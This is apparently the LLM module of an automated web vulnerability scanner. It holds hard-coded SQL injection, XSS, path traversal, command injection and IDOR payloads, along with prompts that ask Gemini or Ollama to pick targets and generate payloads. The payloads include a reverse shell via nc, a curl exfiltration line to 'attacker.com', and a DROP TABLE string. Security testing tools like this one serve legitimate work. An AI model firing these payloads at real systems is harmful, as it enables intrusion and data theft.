import google.generativeai as genai
import ollama
import json
import logging
from typing import List, Dict, Optional, Union
from config import config
import asyncio
import aiohttp

logger = logging.getLogger(__name__)

class LLMClient:
    """Base class for LLM clients"""
    
    def __init__(self):
        pass
    
    async def generate_response(self, prompt: str, context: str = "") -> str:
        raise NotImplementedError
    
    async def analyze_target(self, target_info: Dict) -> Dict:
        raise NotImplementedError
    
    async def generate_payload(self, vulnerability_type: str, target_info: Dict) -> List[str]:
        raise NotImplementedError
    
    async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
        """Analyze response to determine if vulnerability exists and suggest next steps"""
        raise NotImplementedError

class BasicClient(LLMClient):
    """Basic client that works without AI - uses predefined payloads"""
    
    def __init__(self):
        super().__init__()
        # Predefined payloads for different vulnerability types - organized by sophistication level
        self.basic_payloads = {
            'sql_injection': {
                'basic': [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "admin'--",
                    "' OR 'x'='x"
                ],
                'intermediate': [
                    "' UNION SELECT NULL--",
                    "1' OR '1'='1' /*",
                    "') OR ('1'='1",
                    "'; DROP TABLE users--"
                ],
                'advanced': [
                    "' UNION SELECT user,password FROM users--",
                    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
                ]
            },
            'xss': {
                'basic': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')"
                ],
                'intermediate': [
                    "<iframe src=javascript:alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<select onfocus=alert('XSS') autofocus>"
                ],
                'advanced': [
                    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
                    "<svg><script>alert('XSS')</script></svg>",
                    "<iframe srcdoc='<script>parent.alert(`XSS`)</script>'>",
                    "<object data='data:text/html,<script>alert(`XSS`)</script>'>"
                ]
            },
            'path_traversal': {
                'basic': [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc//passwd"
                ],
                'intermediate': [
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
                ],
                'advanced': [
                    "/var/www/../../etc/passwd%00.jpg",
                    "../../../../../../../etc/passwd%00",
                    "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts%00.txt"
                ]
            },
            'command_injection': {
                'basic': [
                    "; ls -la",
                    "| whoami",
                    "; cat /etc/passwd",
                    "& dir"
                ],
                'intermediate': [
                    "; id",
                    "| cat /etc/hosts",
                    "; uname -a",
                    "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
                ],
                'advanced': [
                    "; curl http://attacker.com/$(whoami)",
                    "| nc -e /bin/sh attacker.com 4444",
                    "; python -c 'import os; os.system(\"id\")'",
                    "& powershell -c Get-Process"
                ]
            },
            'idor': {
                'basic': [
                    "../admin",
                    "../../user/1",
                    "/admin/users",
                    "?id=1"
                ],
                'intermediate': [
                    "?user_id=1",
                    "?account_id=1",
                    "/user/2",
                    "/profile/admin"
                ],
                'advanced': [
                    "?role=admin&user_id=1",
                    "/api/user/1/sensitive",
                    "?id=1&force=true",
                    "/admin/user/1/privileges"
                ]
            }
        }
    
    async def generate_response(self, prompt: str, context: str = "") -> str:
        return "Basic mode - no AI analysis available"
    
    async def analyze_target(self, target_info: Dict) -> Dict:
        """Basic analysis without AI"""
        priority_endpoints = []
        form_analysis = []
        
        # Simple heuristic analysis
        interesting_endpoints = target_info.get('interesting_endpoints', [])
        links = target_info.get('links', [])
        
        # Analyze interesting endpoints first
        for endpoint in interesting_endpoints[:5]:
            priority = 7  # Default medium priority
            vuln_types = ['sql_injection', 'xss']
            confidence = 0.6
            
            url_lower = endpoint['url'].lower()
            if any(keyword in url_lower for keyword in ['admin', 'manage', 'control']):
                priority = 9
                vuln_types = ['sql_injection', 'xss', 'idor']
                confidence = 0.8
            elif any(keyword in url_lower for keyword in ['api', 'json', 'xml']):
                priority = 8
                vuln_types = ['sql_injection', 'idor']
                confidence = 0.7
            elif any(keyword in url_lower for keyword in ['login', 'auth', 'signin']):
                priority = 8
                vuln_types = ['sql_injection', 'xss']
                confidence = 0.7
            elif any(keyword in url_lower for keyword in ['upload', 'file', 'download']):
                priority = 8
                vuln_types = ['path_traversal', 'xss']
                confidence = 0.7
            
            priority_endpoints.append({
                'url': endpoint['url'],
                'priority': priority,
                'vulnerability_types': vuln_types,
                'confidence': confidence,
                'reasoning': f"Basic analysis of {endpoint['type']} endpoint with keywords detected"
            })
        
        # Analyze regular links for potential vulnerabilities
        for link in links[:10]:  # Check top 10 links
            if any(param in link for param in ['?id=', '?user=', '?page=', '?file=']):
                priority_endpoints.append({
                    'url': link,
                    'priority': 6,
                    'vulnerability_types': ['sql_injection', 'xss', 'idor'],
                    'confidence': 0.5,
                    'reasoning': 'URL contains parameters that may be vulnerable to injection'
                })
        
        # Analyze forms
        for form in target_info.get('forms', [])[:5]:
            risk_level = 'medium'
            recommended_tests = ['sql_injection', 'xss']
            confidence = 0.6
            
            if form.get('has_file_upload'):
                risk_level = 'high'
                recommended_tests.append('path_traversal')
                confidence = 0.8
            
            # Check for login forms
            form_inputs = [inp.get('name', '').lower() for inp in form.get('inputs', [])]
            if any(field in form_inputs for field in ['password', 'passwd', 'login', 'email']):
                risk_level = 'high'
                recommended_tests = ['sql_injection', 'xss']
                confidence = 0.8
            
            form_analysis.append({
                'form_url': form['url'],
                'action_url': form['action'],
                'method': form['method'],
                'risk_level': risk_level,
                'recommended_tests': recommended_tests,
                'confidence': confidence,
                'reasoning': 'Basic form analysis - detected input fields and upload capabilities'
            })
        
        return {
            'priority_endpoints': sorted(priority_endpoints, key=lambda x: x['priority'], reverse=True),
            'form_analysis': form_analysis,
            'testing_strategy': 'Basic vulnerability testing with heuristic analysis. Testing will focus on high-priority endpoints first.',
            'total_targets': len(priority_endpoints) + len(form_analysis)
        }
    
    async def generate_payload(self, vulnerability_type: str, target_info: Dict, level: str = 'basic') -> List[str]:
        """Return predefined payloads for vulnerability type at specified sophistication level"""
        payloads = self.basic_payloads.get(vulnerability_type, {})
        return payloads.get(level, payloads.get('basic', []))
    
    async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
        """Basic response analysis without AI"""
        response_text = response_data.get('response_text', '').lower()
        status_code = response_data.get('status_code', 200)
        response_time = response_data.get('response_time', 0)
        
        vulnerability_indicators = []
        confidence = 0.0
        next_level = None
        
        # Basic pattern matching for different vulnerability types
        if vulnerability_type == 'sql_injection':
            sql_errors = ['mysql', 'syntax error', 'database', 'sql', 'oracle', 'postgresql']
            for error in sql_errors:
                if error in response_text:
                    vulnerability_indicators.append(f"SQL error detected: {error}")
                    confidence += 0.3
            
            if status_code == 500:
                vulnerability_indicators.append("Internal server error - possible SQL injection")
                confidence += 0.2
        
        elif vulnerability_type == 'xss':
            if payload.lower() in response_text:
                vulnerability_indicators.append("Payload reflected in response")
                confidence += 0.4
            
            if '<script>' in response_text and 'alert' in response_text:
                vulnerability_indicators.append("JavaScript execution context detected")
                confidence += 0.5
        
        elif vulnerability_type == 'path_traversal':
            file_indicators = ['root:', '[boot loader]', 'windows', 'etc/passwd']
            for indicator in file_indicators:
                if indicator in response_text:
                    vulnerability_indicators.append(f"File system access detected: {indicator}")
                    confidence += 0.4
        
        elif vulnerability_type == 'command_injection':
            command_indicators = ['uid=', 'gid=', 'windows', 'total ', 'drwx']
            for indicator in command_indicators:
                if indicator in response_text:
                    vulnerability_indicators.append(f"Command execution detected: {indicator}")
                    confidence += 0.4
        
        # Determine next testing level
        if confidence > 0.3:
            next_level = 'intermediate'
        if confidence > 0.6:
            next_level = 'advanced'
        
        return {
            'vulnerable': confidence > 0.3,
            'confidence': min(confidence, 1.0),
            'indicators': vulnerability_indicators,
            'next_level': next_level,
            'recommended_action': 'manual_verification' if confidence > 0.5 else 'continue_testing'
        }

class GeminiClient(LLMClient):
    """Gemini API client for vulnerability analysis and payload generation"""
    
    def __init__(self):
        super().__init__()
        if not config.gemini_api_key:
            raise ValueError("Gemini API key not provided")
        
        genai.configure(api_key=config.gemini_api_key)
        self.model = genai.GenerativeModel(config.gemini_model)
        
    async def generate_response(self, prompt: str, context: str = "") -> str:
        """Generate response using Gemini"""
        try:
            full_prompt = f"{context}\n\n{prompt}" if context else prompt
            response = self.model.generate_content(full_prompt)
            return response.text
        except Exception as e:
            logger.error(f"Gemini API error: {str(e)}")
            return ""
    
    async def analyze_target(self, target_info: Dict) -> Dict:
        """Analyze target for potential vulnerabilities"""
        prompt = f"""
        You are a cybersecurity expert analyzing a web application for potential vulnerabilities.
        Your goal is to identify the MOST LIKELY vulnerable endpoints to test efficiently.
        
        Target Information:
        - Base URL: {target_info.get('base_url', 'Unknown')}
        - Total Links: {target_info.get('total_links', 0)}
        - Total Forms: {target_info.get('total_forms', 0)}
        - Interesting Endpoints: {len(target_info.get('interesting_endpoints', []))}
        
        Sample Links (first 20):
        {json.dumps(target_info.get('links', [])[:20], indent=2)}
        
        Forms Found:
        {json.dumps(target_info.get('forms', [])[:5], indent=2)}
        
        Interesting Endpoints:
        {json.dumps(target_info.get('interesting_endpoints', [])[:10], indent=2)}
        
        Please analyze and prioritize targets for vulnerability testing:
        1. Identify TOP 10 most likely vulnerable endpoints (prioritize by actual vulnerability potential)
        2. Rate each endpoint's vulnerability likelihood (1-10 scale)
        3. Specify which vulnerability types to test for each endpoint
        4. Provide confidence score (0.0-1.0) for each assessment
        5. Analyze forms for injection points and risk levels
        
        Focus on:
        - URLs with parameters (GET/POST)
        - Login/authentication forms
        - Admin/management interfaces
        - File upload functionality
        - API endpoints
        - Search functionality
        - User input fields
        
        Respond in JSON format:
        {{
            "priority_endpoints": [
                {{
                    "url": "endpoint_url",
                    "priority": 9,
                    "vulnerability_types": ["sql_injection", "xss"],
                    "confidence": 0.8,
                    "reasoning": "detailed explanation of why this endpoint is likely vulnerable"
                }}
            ],
            "form_analysis": [
                {{
                    "form_url": "form_page_url",
                    "action_url": "form_action_url", 
                    "method": "POST",
                    "risk_level": "high",
                    "recommended_tests": ["sql_injection", "xss"],
                    "confidence": 0.7,
                    "reasoning": "explanation of form vulnerability potential"
                }}
            ],
            "testing_strategy": "prioritized testing approach",
            "total_targets": 15
        }}
        """
        
        response = await self.generate_response(prompt)
        try:
            return json.loads(response)
        except json.JSONDecodeError:
            logger.error("Failed to parse Gemini response as JSON")
            return {"error": "Failed to parse analysis"}
    
    async def generate_payload(self, vulnerability_type: str, target_info: Dict, level: str = 'basic') -> List[str]:
        """Generate vulnerability-specific payloads"""
        prompt = f"""
        Generate {level} level {vulnerability_type} payloads for testing this specific target:
        
        Target Info: {json.dumps(target_info, indent=2)}
        
        Level Guidelines:
        - basic: Simple, common payloads for initial testing
        - intermediate: More sophisticated payloads with encoding/bypasses
        - advanced: Complex payloads for deep testing and confirmation
        
        Requirements for {level} level:
        1. Generate 8-12 diverse payloads specifically for {vulnerability_type}
        2. Consider the target URL structure and parameters
        3. Include context-appropriate payloads based on the endpoint
        4. Ensure payloads are safe for testing (no destructive operations)
        5. For {level} level, focus on sophistication appropriate to the level
        
        Target context: {target_info.get('url', 'unknown')}
        Parameters: {target_info.get('parameters', [])}
        
        Respond with ONLY a JSON array of payload strings:
        ["payload1", "payload2", "payload3", ...]
        """
        
        response = await self.generate_response(prompt)
        try:
            payloads = json.loads(response)
            return payloads if isinstance(payloads, list) else []
        except json.JSONDecodeError:
            logger.error(f"Failed to parse {vulnerability_type} payloads from Gemini")
            return []
    
    async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
        """Analyze response to determine vulnerability and next steps"""
        prompt = f"""
        Analyze this HTTP response to determine if a {vulnerability_type} vulnerability exists:
        
        Request Details:
        - URL: {response_data.get('url', 'unknown')}
        - Payload Used: {payload}
        - Vulnerability Type: {vulnerability_type}
        
        Response Data:
        - Status Code: {response_data.get('status_code', 'unknown')}
        - Response Time: {response_data.get('response_time', 'unknown')}s
        - Response Length: {response_data.get('response_length', 'unknown')} bytes
        - Response Text (first 1000 chars): {response_data.get('response_text', '')[:1000]}
        
        Previous Indicators Found: {response_data.get('previous_indicators', [])}
        
        Please analyze and determine:
        1. Is this endpoint vulnerable to {vulnerability_type}? (true/false)
        2. Confidence level (0.0-1.0)
        3. Specific vulnerability indicators found
        4. What testing level should be used next (basic/intermediate/advanced/none)
        5. Recommended next action
        
        Look for:
        - Error messages indicating {vulnerability_type}
        - Payload reflection or execution
        - Behavioral changes in response
        - Status code anomalies
        - Response time variations
        - Content changes
        
        Respond in JSON format:
        {{
            "vulnerable": true/false,
            "confidence": 0.0-1.0,
            "indicators": ["list of specific indicators found"],
            "next_level": "basic/intermediate/advanced/none",
            "recommended_action": "continue_testing/manual_verification/confirmed_vulnerable/not_vulnerable",
            "explanation": "detailed analysis of the response"
        }}
        """
        
        response = await self.generate_response(prompt)
        try:
            return json.loads(response)
        except json.JSONDecodeError:
            logger.error("Failed to parse vulnerability analysis from Gemini")
            return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}

class OllamaClient(LLMClient):
    """Ollama client for local LLM analysis"""
    
    def __init__(self):
        super().__init__()
        self.client = ollama.Client(host=config.ollama_host)
        self.model = config.ollama_model
        
        # Test connection
        try:
            self.client.list()
            logger.info(f"Connected to Ollama at {config.ollama_host}")
        except Exception as e:
            logger.warning(f"Ollama connection failed: {str(e)}")
            self.client = None
    
    async def generate_response(self, prompt: str, context: str = "") -> str:
        """Generate response using Ollama"""
        if not self.client:
            logger.error("Ollama client not available")
            return ""
        
        try:
            full_prompt = f"{context}\n\n{prompt}" if context else prompt
            response = self.client.chat(model=self.model, messages=[
                {'role': 'user', 'content': full_prompt}
            ])
            return response['message']['content']
        except Exception as e:
            logger.error(f"Ollama API error: {str(e)}")
            return ""
    
    async def analyze_target(self, target_info: Dict) -> Dict:
        """Analyze target using Ollama"""
        prompt = f"""
        As a cybersecurity expert, analyze this web application for vulnerability testing priorities:
        
        Target: {target_info.get('base_url')}
        Links: {target_info.get('total_links', 0)}
        Forms: {target_info.get('total_forms', 0)}
        
        Sample endpoints:
        {json.dumps(target_info.get('links', [])[:15], indent=2)}
        
        Key forms and endpoints:
        {json.dumps(target_info.get('forms', [])[:3], indent=2)}
        {json.dumps(target_info.get('interesting_endpoints', [])[:5], indent=2)}
        
        Provide analysis in JSON format with:
        - priority_endpoints: array of high-value targets with priority (1-10), vulnerability types, and confidence (0.0-1.0)
        - form_analysis: detailed form risk assessment
        - testing_strategy: recommended approach
        - total_targets: number of targets to test
        
        Focus on endpoints most likely to be vulnerable.
        """
        
        response = await self.generate_response(prompt)
        try:
            # Extract JSON from response if it's embedded in text
            json_start = response.find('{')
            json_end = response.rfind('}') + 1
            if json_start != -1 and json_end != -1:
                json_str = response[json_start:json_end]
                return json.loads(json_str)
            else:
                return {"error": "No JSON found in response"}
        except json.JSONDecodeError:
            logger.error("Failed to parse Ollama response as JSON")
            return {"error": "Failed to parse analysis"}
    
    async def generate_payload(self, vulnerability_type: str, target_info: Dict, level: str = 'basic') -> List[str]:
        """Generate payloads using Ollama"""
        prompt = f"""
        Generate {level} level {vulnerability_type} test payloads for:
        URL: {target_info.get('url', 'unknown')}
        Method: {target_info.get('method', 'GET')}
        Parameters: {target_info.get('parameters', [])}
        
        Create 10-12 {level} sophistication payloads focusing on:
        1. {vulnerability_type} patterns appropriate for {level} level
        2. Context-specific variations for this endpoint
        3. Safe testing payloads (no destructive operations)
        
        Return only a JSON array: ["payload1", "payload2", ...]
        """
        
        response = await self.generate_response(prompt)
        try:
            # Extract JSON array from response
            start = response.find('[')
            end = response.rfind(']') + 1
            if start != -1 and end != -1:
                json_str = response[start:end]
                payloads = json.loads(json_str)
                return payloads if isinstance(payloads, list) else []
            else:
                return []
        except json.JSONDecodeError:
            logger.error(f"Failed to parse {vulnerability_type} payloads from Ollama")
            return []
    
    async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
        """Analyze response using Ollama"""
        prompt = f"""
        Analyze if this response indicates a {vulnerability_type} vulnerability:
        
        Payload: {payload}
        Status: {response_data.get('status_code')}
        Response: {response_data.get('response_text', '')[:800]}
        
        Determine:
        1. Is it vulnerable? (true/false)
        2. Confidence (0.0-1.0)
        3. Indicators found
        4. Next testing level (basic/intermediate/advanced/none)
        
        Respond in JSON: {{"vulnerable": bool, "confidence": float, "indicators": [], "next_level": "string"}}
        """
        
        response = await self.generate_response(prompt)
        try:
            json_start = response.find('{')
            json_end = response.rfind('}') + 1
            if json_start != -1 and json_end != -1:
                json_str = response[json_start:json_end]
                return json.loads(json_str)
            else:
                return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}
        except json.JSONDecodeError:
            logger.error("Failed to parse vulnerability analysis from Ollama")
            return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}

class LLMManager:
    """Manages multiple LLM clients and provides unified interface"""
    
    def __init__(self):
        self.clients = {}
        
        # Initialize Gemini client if API key is available
        if config.gemini_api_key:
            try:
                self.clients['gemini'] = GeminiClient()
                logger.info("Gemini client initialized")
            except Exception as e:
                logger.error(f"Failed to initialize Gemini client: {str(e)}")
        
        # Initialize Ollama client
        try:
            ollama_client = OllamaClient()
            if ollama_client.client:
                self.clients['ollama'] = ollama_client
                logger.info("Ollama client initialized")
        except Exception as e:
            logger.error(f"Failed to initialize Ollama client: {str(e)}")
        
        # Add basic client as fallback
        if not self.clients:
            self.clients['basic'] = BasicClient()
            logger.warning("No AI clients available. Using basic mode with predefined payloads.")
            logger.warning("For better results, configure Gemini API key or install Ollama.")
    
    def get_preferred_client(self, preference: str = "gemini") -> LLMClient:
        """Get preferred LLM client"""
        if preference in self.clients:
            return self.clients[preference]
        elif self.clients:
            return list(self.clients.values())[0]
        else:
            raise ValueError("No LLM clients available")
    
    async def analyze_target_with_fallback(self, target_info: Dict, preference: str = "gemini") -> Dict:
        """Analyze target with fallback to other clients"""
        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
        
        for client_name in client_order:
            if client_name in self.clients:
                try:
                    logger.info(f"Analyzing target with {client_name}")
                    result = await self.clients[client_name].analyze_target(target_info)
                    if result and "error" not in result:
                        return result
                except Exception as e:
                    logger.error(f"Analysis failed with {client_name}: {str(e)}")
                    continue
        
        return {"error": "All LLM clients failed to analyze target"}
    
    async def generate_payloads_with_fallback(self, vulnerability_type: str, target_info: Dict, level: str = 'basic', preference: str = "gemini") -> List[str]:
        """Generate payloads with fallback"""
        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
        
        for client_name in client_order:
            if client_name in self.clients:
                try:
                    logger.info(f"Generating {vulnerability_type} {level} payloads with {client_name}")
                    if hasattr(self.clients[client_name], 'generate_payload'):
                        payloads = await self.clients[client_name].generate_payload(vulnerability_type, target_info, level)
                    else:
                        payloads = await self.clients[client_name].generate_payload(vulnerability_type, target_info)
                    if payloads:
                        return payloads
                except Exception as e:
                    logger.error(f"Payload generation failed with {client_name}: {str(e)}")
                    continue
        
        logger.error("All LLM clients failed to generate payloads")
        return []
    
    async def analyze_vulnerability_response_with_fallback(self, response_data: Dict, payload: str, vulnerability_type: str, preference: str = "gemini") -> Dict:
        """Analyze vulnerability response with fallback"""
        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
        
        for client_name in client_order:
            if client_name in self.clients:
                try:
                    logger.info(f"Analyzing response with {client_name}")
                    result = await self.clients[client_name].analyze_vulnerability_response(response_data, payload, vulnerability_type)
                    if result:
                        return result
                except Exception as e:
                    logger.error(f"Response analysis failed with {client_name}: {str(e)}")
                    continue
        
        return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}